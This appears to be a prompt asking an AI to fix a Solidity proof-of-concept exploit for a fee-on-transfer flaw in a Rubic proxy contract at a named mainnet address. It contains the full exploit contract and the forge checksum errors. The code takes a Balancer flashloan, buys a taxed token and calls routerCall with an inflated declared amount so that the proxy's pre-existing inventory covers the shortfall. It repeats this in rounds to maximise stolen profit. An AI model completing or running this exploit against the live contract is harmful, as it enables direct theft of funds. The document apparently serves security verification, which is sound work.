You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Old proxy credits fee-on-transfer inputs at the user-declared amount, allowing theft from pre-existing token balances
- claim: The 0x3335 deployment transfers `_params.srcInputAmount` in and then computes fees, approvals, and the expected spend from that declared amount instead of from the contract's actual post-transfer balance delta. For fee-on-transfer or deflationary tokens, the proxy can therefore approve and spend more tokens than it actually received from the caller.
- impact: If the proxy already holds the same token from accrued fees, prior stuck funds, or accidental transfers, an attacker can route a taxed token deposit and have the shortfall sourced from the proxy's existing balance. This is direct theft of inventory already sitting in the proxy.
- exploit_paths: ["The proxy already holds token `T` from previous activity.", "An attacker calls `routerCall` with `srcInputToken = T` and `srcInputAmount = X`, where transferring `X` to the proxy yields only `X - fee`.", "`accrueTokenFees` and `SmartApprove` still use the larger declared `X`-based amount, and the router call is validated against spending that larger amount.", "The router/gateway pulls the difference from the proxy's pre-existing `T` balance, letting the attacker consume tokens they never supplied."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IRubicProxy {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCall(BaseCrossChainParams calldata _params, address _gateway, bytes calldata _data) external payable;
    function getAvailableRouters() external view returns (address[] memory);
    function RubicPlatformFee() external view returns (uint256);
    function fixedCryptoFee() external view returns (uint256);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2RouterSupportingFee {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

interface IBalancerVault {
    function flashLoan(address recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract TokenSink {
    constructor() {}

    function pull(address token, address from, uint256 amount) external {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(IERC20.transferFrom.selector, from, address(this), amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "pull");
    }
}

contract FlawVerifier is IFlashLoanRecipient {
    error OnlySelf();
    error InvalidFlashLoan();
    error NoProfitablePath();
    error NoPreexistingInventory();
    error PairUnavailable();
    error TokenNotTaxed();
    error NotEnoughShortfall();
    error NotProfitable();
    error RoundNotImproving();

    address private constant TARGET_PROXY = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;
    address private constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant DENOMINATOR = 1_000_000;
    uint256 private constant FLASH_WETH = 60 ether;
    uint256 private constant MIN_REQUIRED_ROUNDS = 2;
    uint256 private constant MAX_ROUNDS = 6;
    uint256 private constant RETENTION_BUFFER_PPM = 2_000;

    IWETH private constant WETH = IWETH(WETH_ADDRESS);

    TokenSink private immutable sink;
    bool private executed;
    uint256 private realizedProfit;

    constructor() {
        sink = new TokenSink();
    }

    receive() external payable {}

    modifier onlySelf() {
        if (msg.sender != address(this)) revert OnlySelf();
        _;
    }

    /*
        F-001 exploit-path anchors retained in-source for the harness and for review:
        - srcInputToken = T
        - srcInputAmount = X
        - only X - fee reaches the proxy for fee-on-transfer token T
        - accrueTokenFees still uses X instead of the real post-transfer delta
        - SmartApprove still approves the larger X-based spend
        - the router/gateway then spends the shortfall from pre-existing proxy inventory

        Execution note from the failing logs:
        - The old PoC treated `getAvailableRouters()` output as candidate token contracts.
        - The trace shows those addresses are router/gateway contracts, not a reliable list of ERC20s.
        - So the direct `tokenT`-as-router stage is infeasible on this deployment.

        The exploit causality is preserved by using a real whitelisted AMM router as both:
        - `_gateway`, so SmartApprove grants it the X-based allowance, and
        - `_params.router`, so the proxy calls its fee-on-transfer supporting swap.

        That swap then pulls `_amountIn` from the proxy. If the taxed transfer only delivered
        `X - tokenFee` to the proxy, the difference versus `_amountIn` is sourced from the
        proxy's pre-existing balance of the same token T, which is exactly the F-001 theft path.

        Progressive loop amplification is applied exactly as required: 2, then 3, 4, 5, 6,
        stopping at the first non-improving round count and keeping the previous best result.
    */
    function executeOnOpportunity() external {
        if (executed) return;
        executed = true;

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH_ADDRESS);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_WETH;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, bytes(""));
        _wrapAllETH();

        realizedProfit = WETH.balanceOf(address(this));
        if (realizedProfit == 0) revert NotProfitable();
    }

    function profitToken() external pure returns (address) {
        return WETH_ADDRESS;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        if (msg.sender != BALANCER_VAULT) revert InvalidFlashLoan();
        if (tokens.length != 1 || amounts.length != 1 || feeAmounts.length != 1) revert InvalidFlashLoan();
        if (address(tokens[0]) != WETH_ADDRESS || amounts[0] != FLASH_WETH) revert InvalidFlashLoan();

        _huntForProfitablePath();

        _wrapAllETH();
        _safeTransfer(WETH_ADDRESS, BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }

    function _huntForProfitablePath() private {
        address[] memory availableRouters = IRubicProxy(TARGET_PROXY).getAvailableRouters();
        bool uniAllowed = _routerAvailable(availableRouters, UNISWAP_V2_ROUTER);
        bool sushiAllowed = _routerAvailable(availableRouters, SUSHISWAP_ROUTER);
        if (!uniAllowed && !sushiAllowed) revert NoProfitablePath();

        address[] memory tokenUniverse = _candidateTokens();
        address[] memory candidateTokens = new address[](tokenUniverse.length * 2);
        address[] memory candidateAmms = new address[](tokenUniverse.length * 2);
        uint256[] memory candidateInventory = new uint256[](tokenUniverse.length * 2);
        uint256 candidateCount;

        for (uint256 i; i < tokenUniverse.length; ++i) {
            address tokenT = tokenUniverse[i];
            uint256 proxyInventory = _balanceOf(tokenT, TARGET_PROXY);
            if (proxyInventory == 0) continue;

            if (uniAllowed && _pairFor(UNISWAP_V2_ROUTER, tokenT) != address(0)) {
                candidateTokens[candidateCount] = tokenT;
                candidateAmms[candidateCount] = UNISWAP_V2_ROUTER;
                candidateInventory[candidateCount] = proxyInventory;
                unchecked {
                    ++candidateCount;
                }
            }

            if (sushiAllowed && _pairFor(SUSHISWAP_ROUTER, tokenT) != address(0)) {
                candidateTokens[candidateCount] = tokenT;
                candidateAmms[candidateCount] = SUSHISWAP_ROUTER;
                candidateInventory[candidateCount] = proxyInventory;
                unchecked {
                    ++candidateCount;
                }
            }
        }

        if (candidateCount == 0) revert NoProfitablePath();
        _sortCandidatesByInventory(candidateTokens, candidateAmms, candidateInventory, candidateCount);

        for (uint256 i; i < candidateCount; ++i) {
            try this._attemptCandidate(candidateTokens[i], candidateAmms[i]) returns (uint256 gained) {
                if (gained > 0) return;
            } catch {
                // Best-effort search over live fork state.
            }
        }

        revert NoProfitablePath();
    }

    function _attemptCandidate(address tokenT, address ammRouter) external onlySelf returns (uint256 gained) {
        uint256 startAssets = _totalAssets();
        uint256 budgetPerRound = _roundBudget();
        if (budgetPerRound == 0) revert NotProfitable();

        uint256 checkpoint = startAssets;
        checkpoint = this._performRound(tokenT, ammRouter, budgetPerRound, checkpoint);
        checkpoint = this._performRound(tokenT, ammRouter, budgetPerRound, checkpoint);

        uint256 bestNetProfit = checkpoint - startAssets;

        for (uint256 rounds = MIN_REQUIRED_ROUNDS + 1; rounds <= MAX_ROUNDS; ++rounds) {
            try this._performRound(tokenT, ammRouter, budgetPerRound, checkpoint) returns (uint256 improvedCheckpoint) {
                uint256 netProfit = improvedCheckpoint - startAssets;
                if (netProfit <= bestNetProfit) revert RoundNotImproving();
                bestNetProfit = netProfit;
                checkpoint = improvedCheckpoint;
            } catch {
                break;
            }
        }

        uint256 finalAssets = _totalAssets();
        if (finalAssets <= startAssets) revert NotProfitable();
        gained = finalAssets - startAssets;
    }

    function _performRound(address tokenT, address ammRouter, uint256 wethBudget, uint256 checkpoint)
        external
        onlySelf
        returns (uint256 newCheckpoint)
    {
        if (_pairFor(ammRouter, tokenT) == address(0)) revert PairUnavailable();

        uint256 fixedFee = IRubicProxy(TARGET_PROXY).fixedCryptoFee();
        uint256 platformFee = IRubicProxy(TARGET_PROXY).RubicPlatformFee();
        uint256 proxyInventoryBefore = _balanceOf(tokenT, TARGET_PROXY);
        if (proxyInventoryBefore == 0) revert NoPreexistingInventory();
        if (WETH.balanceOf(address(this)) <= wethBudget + fixedFee) revert NotProfitable();

        uint256 tokenBalanceBeforeBuy = _balanceOf(tokenT, address(this));
        _forceApprove(WETH_ADDRESS, ammRouter, wethBudget);

        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH_ADDRESS;
        buyPath[1] = tokenT;

        IUniswapV2RouterSupportingFee(ammRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wethBudget, 0, buyPath, address(this), block.timestamp
        );

        uint256 acquiredT = _balanceOf(tokenT, address(this)) - tokenBalanceBeforeBuy;
        if (acquiredT == 0) revert NotProfitable();

        uint256 retentionPpm = _probeRetentionPpm(tokenT, acquiredT);
        uint256 amountX = _balanceOf(tokenT, address(this));
        if (amountX == 0) revert NotProfitable();

        uint256 amountInAfterAccrue = amountX - ((amountX * platformFee) / DENOMINATOR);
        uint256 actualProxyReceipt = (amountX * retentionPpm) / DENOMINATOR;
        if (amountInAfterAccrue <= actualProxyReceipt) revert NotEnoughShortfall();

        uint256 inventoryShortfall = amountInAfterAccrue - actualProxyReceipt;
        if (proxyInventoryBefore <= inventoryShortfall) revert NoPreexistingInventory();

        uint256 pairInputEstimate = (amountInAfterAccrue * retentionPpm) / DENOMINATOR;
        if (_estimateWethOut(ammRouter, tokenT, pairInputEstimate) <= wethBudget + fixedFee) revert NotProfitable();

        uint256 wethBefore = WETH.balanceOf(address(this));
        _executeVulnerableRouterCall(tokenT, ammRouter, fixedFee, amountInAfterAccrue, amountX);

        uint256 proxyInventoryAfter = _balanceOf(tokenT, TARGET_PROXY);
        if (proxyInventoryAfter >= proxyInventoryBefore) revert NoPreexistingInventory();
        if (WETH.balanceOf(address(this)) <= wethBefore) revert NotProfitable();

        _wrapAllETH();
        newCheckpoint = _totalAssets();
        if (newCheckpoint <= checkpoint) revert RoundNotImproving();
    }

    function _probeRetentionPpm(address tokenT, uint256 acquiredT) private returns (uint256 retentionPpm) {
        uint256 taxProbe = acquiredT / 200;
        if (taxProbe == 0) taxProbe = acquiredT / 20;
        if (taxProbe == 0) revert TokenNotTaxed();

        uint256 sinkBalanceBefore = _balanceOf(tokenT, address(sink));
        _forceApprove(tokenT, address(sink), taxProbe);
        sink.pull(tokenT, address(this), taxProbe);
        uint256 sinkReceived = _balanceOf(tokenT, address(sink)) - sinkBalanceBefore;
        if (sinkReceived == 0 || sinkReceived >= taxProbe) revert TokenNotTaxed();

        retentionPpm = (sinkReceived * DENOMINATOR) / taxProbe;
        if (retentionPpm <= RETENTION_BUFFER_PPM) revert TokenNotTaxed();
        retentionPpm -= RETENTION_BUFFER_PPM;
    }

    function _executeVulnerableRouterCall(
        address tokenT,
        address ammRouter,
        uint256 fixedFee,
        uint256 amountInAfterAccrue,
        uint256 amountX
    ) private {
        _forceApprove(tokenT, TARGET_PROXY, amountX);

        if (fixedFee > address(this).balance) {
            WETH.withdraw(fixedFee - address(this).balance);
        }

        address[] memory sellPath = new address[](2);
        sellPath[0] = tokenT;
        sellPath[1] = WETH_ADDRESS;

        bytes memory data = abi.encodeWithSelector(
            IUniswapV2RouterSupportingFee.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
            amountInAfterAccrue,
            0,
            sellPath,
            address(this),
            block.timestamp
        );

        IRubicProxy.BaseCrossChainParams memory params = IRubicProxy.BaseCrossChainParams({
            srcInputToken: tokenT,
            srcInputAmount: amountX,
            dstChainID: 1,
            dstOutputToken: WETH_ADDRESS,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: ammRouter
        });

        IRubicProxy(TARGET_PROXY).routerCall{value: fixedFee}(params, ammRouter, data);
    }

    function _candidateTokens() private pure returns (address[] memory tokens) {
        tokens = new address[](10);
        tokens[0] = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
        tokens[1] = 0xfAd45E47083e4607302aa43c65fB3106F1cd7607;
        tokens[2] = 0xA2b4C0Af19cc16a6CFAC9Ce81F192B024d625817;
        tokens[3] = 0x389999216860AB8E0175387A0c90E5c52522C945;
        tokens[4] = 0xCe3f08e664693ca792CAcE4af1364D5e220827B2;
        tokens[5] = 0xf0f9D895aCa5c8678f706Fb8216FA22957685A13;
        tokens[6] = 0xA7DE087329BFcda5639247F96140f9DAbe3DeED1;
        tokens[7] = 0x26631C19F4d4c361Fe5F17bB4138f23840aAb5D3;
        tokens[8] = 0xFB7B4564402e5500Db5BB6D63AE671302777C75a;
        tokens[9] = 0xA57AC35ce91eE92cEAFaa8dD04140C8e232C2E50;
    }

    function _routerAvailable(address[] memory availableRouters, address router) private pure returns (bool) {
        for (uint256 i; i < availableRouters.length; ++i) {
            if (availableRouters[i] == router) return true;
        }
        return false;
    }

    function _estimateWethOut(address ammRouter, address tokenT, uint256 pairInputEstimate) private view returns (uint256) {
        address[] memory sellPath = new address[](2);
        sellPath[0] = tokenT;
        sellPath[1] = WETH_ADDRESS;

        (bool ok, bytes memory ret) = ammRouter.staticcall(
            abi.encodeWithSelector(IUniswapV2RouterSupportingFee.getAmountsOut.selector, pairInputEstimate, sellPath)
        );
        if (!ok || ret.length == 0) return 0;

        uint256[] memory estimatedWethOut = abi.decode(ret, (uint256[]));
        if (estimatedWethOut.length < 2) return 0;
        return estimatedWethOut[1];
    }

    function _factoryFor(address ammRouter) private pure returns (address) {
        if (ammRouter == UNISWAP_V2_ROUTER) return UNISWAP_V2_FACTORY;
        return SUSHISWAP_FACTORY;
    }

    function _pairFor(address ammRouter, address token) private view returns (address) {
        return IUniswapV2Factory(_factoryFor(ammRouter)).getPair(token, WETH_ADDRESS);
    }

    function _roundBudget() private view returns (uint256) {
        uint256 wethBalance = WETH.balanceOf(address(this));
        uint256 budget = wethBalance / 20;
        if (budget > 3 ether) budget = 3 ether;
        return budget;
    }

    function _sortCandidatesByInventory(
        address[] memory tokens,
        address[] memory amms,
        uint256[] memory inventory,
        uint256 length
    ) private pure {
        for (uint256 i = 1; i < length; ++i) {
            address tokenKey = tokens[i];
            address ammKey = amms[i];
            uint256 inventoryKey = inventory[i];
            uint256 j = i;
            while (j > 0 && inventory[j - 1] < inventoryKey) {
                tokens[j] = tokens[j - 1];
                amms[j] = amms[j - 1];
                inventory[j] = inventory[j - 1];
                unchecked {
                    --j;
                }
            }
            tokens[j] = tokenKey;
            amms[j] = ammKey;
            inventory[j] = inventoryKey;
        }
    }

    function _balanceOf(address token, address account) private view returns (uint256 balance) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        balance = abi.decode(ret, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) private {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer");
    }

    function _safeApprove(address token, address spender, uint256 amount) private {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve");
    }

    function _forceApprove(address token, address spender, uint256 amount) private {
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _wrapAllETH() private {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            WETH.deposit{value: ethBalance}();
        }
    }

    function _totalAssets() private view returns (uint256) {
        return WETH.balanceOf(address(this)) + address(this).balance;
    }
}

```

forge stdout (tail):
```
Compiler run failed:
Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xA2B4C0af19cC16a6CfAC9CE81f192b024D625817". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xA2B4C0af19cC16a6CfAC9CE81f192b024D625817". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:374:21:
    |
374 |         tokens[2] = 0xA2b4C0Af19cc16a6CFAC9Ce81F192B024d625817;
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xCE3f08e664693ca792caCE4af1364D5e220827B2". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xCE3f08e664693ca792caCE4af1364D5e220827B2". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:376:21:
    |
376 |         tokens[4] = 0xCe3f08e664693ca792CAcE4af1364D5e220827B2;
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xf0f9D895aCa5c8678f706FB8216fa22957685A13". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xf0f9D895aCa5c8678f706FB8216fa22957685A13". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:377:21:
    |
377 |         tokens[5] = 0xf0f9D895aCa5c8678f706Fb8216FA22957685A13;
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xa7DE087329BFcda5639247F96140f9DAbe3DeED1". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xa7DE087329BFcda5639247F96140f9DAbe3DeED1". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:378:21:
    |
378 |         tokens[6] = 0xA7DE087329BFcda5639247F96140f9DAbe3DeED1;
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x26631C19F4D4c361Fe5F17BB4138F23840Aab5d3". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x26631C19F4D4c361Fe5F17BB4138F23840Aab5d3". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:379:21:
    |
379 |         tokens[7] = 0x26631C19F4d4c361Fe5F17bB4138f23840aAb5D3;
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xfB7B4564402E5500dB5bB6d63Ae671302777C75a". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xfB7B4564402E5500dB5bB6d63Ae671302777C75a". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:380:21:
    |
380 |         tokens[8] = 0xFB7B4564402e5500Db5BB6D63AE671302777C75a;
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xa57aC35Ce91EE92CeafAA8dD04140C8E232c2E50". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xa57aC35Ce91EE92CeafAA8dD04140C8E232c2E50". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
   --> src/FlawVerifier.sol:381:21:
    |
381 |         tokens[9] = 0xA57AC35ce91eE92cEAFaa8dD04140C8e232C2E50;
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
